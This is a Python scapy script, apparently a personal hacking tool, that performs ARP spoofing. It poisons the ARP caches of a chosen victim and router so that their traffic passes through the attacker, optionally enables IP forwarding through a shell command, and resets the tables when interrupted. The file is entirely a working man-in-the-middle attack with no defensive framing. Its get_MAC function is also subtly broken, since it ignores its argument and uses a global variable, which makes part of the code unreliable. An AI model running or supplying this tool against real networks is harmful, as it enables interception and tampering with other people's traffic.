#!/usr/bin/env python3
"""Author = Vishal Raj
Version = 1.0
Year = 2022
Linkedin = www.linkedin.com/in/vishal-raj007"""

import scapy.all as scapy
import os
import sys
import time
import subprocess
from scapy.layers.l2 import Ether, ARP


def check_root():
    if os.environ.get("USER") != "root":
        sys.exit("This script must be run as root.")


def host_discover(ip):
    ans = scapy.srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), timeout=2, verbose=False)[0]  # if host is alive we
    # will get answer otherwise we will get None.
    if len(ans) == 0:
        print("\n[-] Target host seems to be down. ")
        sys.exit()


def get_MAC(ip):  # It will return MAC Address of provided IP.
    arp_request = scapy.ARP(pdst=target_ip)  # Creating an ARP packet with victim destination IP and storing in at
    # variable name arp_request.
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")  # Broadcast Ethernet frames.
    arp_request_broadcast = broadcast / arp_request  # Combining both headers file(Ether+ARP).
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]  # send and receive packet at layer 2.
    return answered_list[0][1].hwsrc  # It will return MAC Address of provided IP.


def spoof(victim_ip, spoof_ip):
    packet = scapy.ARP(op=2, pdst=victim_ip, hwdst=get_MAC(victim_ip), psrc=spoof_ip)  # Create ARP Response Packet
    scapy.send(packet, verbose=False)  # Sending ARP Response to victim


def restore(src_ip, dst_ip):
    packet = scapy.ARP(op=2, psrc=src_ip, hwsrc=get_MAC(src_ip), pdst=dst_ip, hwdst=get_MAC(dst_ip))
    scapy.send(packet, count=4, verbose=False)


if __name__ == "__main__":
    check_root()  # This function will check if script is run as root user.
    target_ip = input("Enter Target IP Address: ")  # Victim IP
    host_discover(target_ip)  # Check if Victim host is alive or not by sending ARP request packet.
    router_ip = input("Enter Router IP Address: ")  # Router IP
    host_discover(router_ip)  # Check if Router is alive or not by sending ARP request packet.

    options = input("Do you want to enable ip forwarding [Yes|No]: ").lower()
    if options == "yes":
        subprocess.call('echo 1 > /proc/sys/net/ipv4/ip_forward', shell=True)  # Enable IPv4 forwarding.
    else:
        pass

    count = 0

    while True:
        try:
            spoof(target_ip, router_ip)  # send packets to victim machine pretending to default gateway.
            spoof(router_ip, target_ip)  # send packets to default gateway pretending to be victim host.
            count = count + 2
            print("\r[+] Packets sent: " + str(count), end="")
            time.sleep(2)
        except KeyboardInterrupt:  # If user press CTRL+C then ARP Spoof attack will stop and restore beck to it ARP
            # table
            print("\n\nKeyboardInterrupt Resetting ARP tables... Please wait.")
            restore(target_ip, router_ip)
            restore(router_ip, target_ip)
            time.sleep(1)
            sys.exit()
